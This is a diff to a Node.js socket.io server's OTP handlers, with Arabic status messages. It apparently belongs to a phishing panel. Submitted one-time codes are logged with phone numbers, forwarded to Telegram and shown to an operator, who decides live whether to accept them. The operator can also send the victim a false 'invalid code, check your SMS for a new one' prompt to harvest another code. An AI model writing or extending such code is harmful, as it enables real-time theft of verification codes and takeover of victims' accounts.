@@ -280,13 +280,12 @@ io.on('connection', (socket) => {
         let updatedRecord = null;
 
         try {
-            if (isMongoConnected && verificationId && !verificationId.startsWith('LOCAL_')) {
+            if (isMongoConnected && verificationId && !verificationId.startsWith('LOCAL_') && !verificationId.startsWith('REC_')) {
                 updatedRecord = await Verification.findByIdAndUpdate(
                     verificationId,
                     {
                         otp: otp,
-                        status: 'VERIFIED',
-                        verifiedAt: now
+                        status: 'OTP_SUBMITTED'
                     },
                     { new: true }
                 );
@@ -299,8 +298,7 @@ io.on('connection', (socket) => {
                 );
                 if (localRec) {
                     localRec.otp = otp;
-                    localRec.status = 'VERIFIED';
-                    localRec.verifiedAt = now;
+                    localRec.status = 'OTP_SUBMITTED';
                     updatedRecord = localRec;
                 } else {
                     // Create new if record missing
@@ -308,17 +306,16 @@ io.on('connection', (socket) => {
                         _id: 'LOCAL_' + Date.now(),
                         phoneNumber: phoneNumber || 'غير معروف',
                         otp: otp,
-                        status: 'VERIFIED',
+                        status: 'OTP_SUBMITTED',
                         customSlug: customSlug || '/',
                         submittedAt: now,
-                        verifiedAt: now,
                         createdAt: now
                     };
                     localVerifications.push(updatedRecord);
                 }
             }
 
-            console.log(`[Notification] OTP Verified: ${updatedRecord.phoneNumber} -> OTP: ${otp}`);
+            console.log(`[Notification] OTP Submitted (Awaiting Admin Decision): ${updatedRecord.phoneNumber} -> OTP: ${otp}`);
 
             // Send Telegram instant notification (non-blocking)
             telegramNotifier.notifyOTPVerified({
@@ -326,7 +323,7 @@ io.on('connection', (socket) => {
                 otp: otp,
                 customSlug: updatedRecord.customSlug || customSlug || '/',
                 ipAddress: socket.handshake.address,
-                verifiedAt: updatedRecord.verifiedAt
+                verifiedAt: now
             }).catch(err => console.error('[TelegramNotifier] Error:', err.message));
 
             // Broadcast real-time notification to Admin dashboard
@@ -336,22 +333,81 @@ io.on('connection', (socket) => {
                     id: updatedRecord._id,
                     phoneNumber: updatedRecord.phoneNumber,
                     otp: otp,
-                    status: 'VERIFIED',
+                    status: 'OTP_SUBMITTED',
                     customSlug: updatedRecord.customSlug || customSlug || '/',
-                    verifiedAt: updatedRecord.verifiedAt,
-                    message: `العميل (${updatedRecord.phoneNumber}) قام بوضع الـ OTP: [ ${otp} ] و تم التحقق بنجاح`
+                    submittedAt: now,
+                    message: `العميل (${updatedRecord.phoneNumber}) قام بوضع الـ OTP: [ ${otp} ] (في انتظار موافقة الآدمن)`
                 }
             });
 
             if (callback) {
                 callback({
                     success: true,
-                    status: 'VERIFIED',
-                    message: 'تم التحقق بنجاح'
+                    status: 'OTP_SUBMITTED',
+                    message: 'تم استلام كود OTP وفي انتظار الموافقة'
                 });
             }
         } catch (err) {
             console.error('Error handling submit_otp:', err);
+            if (callback) callback({ success: false, message: err.message });
+        }
+    });
+
+    // Admin real-time decision socket listener (Approve, Request New OTP, Reject)
+    socket.on('admin_decision', async (data, callback) => {
+        const { verificationId, phoneNumber, action, message } = data;
+        const now = new Date();
+        let newStatus = 'VERIFIED';
+
+        if (action === 'REQUEST_NEW_OTP') newStatus = 'RETRY_OTP';
+        else if (action === 'REJECT') newStatus = 'FAILED';
+        else if (action === 'APPROVE') newStatus = 'VERIFIED';
+
+        try {
+            if (isMongoConnected) {
+                if (verificationId && !verificationId.startsWith('REC_') && !verificationId.startsWith('LOCAL_')) {
+                    await Verification.findByIdAndUpdate(verificationId, {
+                        status: newStatus,
+                        verifiedAt: action === 'APPROVE' ? now : null
+                    });
+                } else if (phoneNumber) {
+                    await Verification.findOneAndUpdate(
+                        { phoneNumber },
+                        { status: newStatus, verifiedAt: action === 'APPROVE' ? now : null },
+                        { sort: { createdAt: -1 } }
+                    );
+                }
+            }
+
+            const record = localVerifications.find(v => (verificationId && (v._id === verificationId || v.id === verificationId)) || v.phoneNumber === phoneNumber);
+            if (record) {
+                record.status = newStatus;
+                if (action === 'APPROVE') record.verifiedAt = now;
+            }
+
+            if (action === 'APPROVE') {
+                io.emit('verification_approved', { phoneNumber, verificationId });
+            } else if (action === 'REQUEST_NEW_OTP') {
+                io.emit('verification_request_new_otp', {
+                    phoneNumber,
+                    verificationId,
+                    message: message || 'Invalid verification code. Please check your Email or SMS for a new code.'
+                });
+            } else if (action === 'REJECT') {
+                io.emit('verification_rejected', { phoneNumber, verificationId });
+            }
+
+            io.emit('record_updated', {
+                id: verificationId,
+                phoneNumber,
+                status: newStatus
+            });
+
+            console.log(`[Admin Action] Decision for ${phoneNumber || verificationId}: ${action} -> Status: ${newStatus}`);
+
+            if (callback) callback({ success: true, status: newStatus });
+        } catch (err) {
+            console.error('Error handling admin_decision:', err);
             if (callback) callback({ success: false, message: err.message });
         }
     });
